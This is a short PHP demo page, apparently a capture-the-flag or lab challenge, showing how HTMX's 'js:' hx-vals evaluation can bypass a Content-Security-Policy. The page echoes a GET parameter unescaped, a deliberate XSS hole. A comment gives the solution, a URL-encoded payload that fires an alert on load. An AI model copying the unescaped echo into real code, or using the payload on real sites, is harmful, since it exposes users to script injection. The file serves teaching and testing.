<?php
header("Content-Security-Policy: sandbox allow-scripts allow-modals; default-src 'self'; style-src 'self' 'sha256-pgn1TCGZX6O77zDvy0oTODMOxemn0oj0LeCnQTRj7Kg='; script-src 'self' 'unsafe-eval'");
// Solution: eval.php?name=%3Cdiv%20hx-vals=%27js:%22a%22:alert(`XSS`)%27%20hx-get=%22/%22%20hx-trigger=%27load%27%3Efoo%3C/div%3E
?>
<!doctype html>
<html>
    <head>
        <title>HTMX demo page</title>
        <script src="htmx.js"></script>
    </head>
    <body>
        <h1>Hello <?php echo $_GET['name'] ?? 'anon'; ?></h1>
        <div hx-get="enabled.php" hx-trigger="load">
            HTMX is not enabled or not working correctly.
        </div>
    </body>
</html>
